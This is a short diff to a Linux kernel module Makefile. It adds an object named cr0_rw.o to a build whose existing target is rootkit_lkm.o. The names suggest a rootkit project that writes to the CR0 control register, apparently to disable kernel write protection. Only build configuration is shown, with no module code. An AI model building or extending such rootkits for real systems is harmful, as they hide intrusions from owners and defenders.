@@ -1,6 +1,6 @@
 
 # Target object name
-obj-m := rootkit_lkm.o
+obj-m := rootkit_lkm.o cr0_rw.o
 
 # Kernel build directory path
 KDIR := /lib/modules/$(shell uname -r)/build
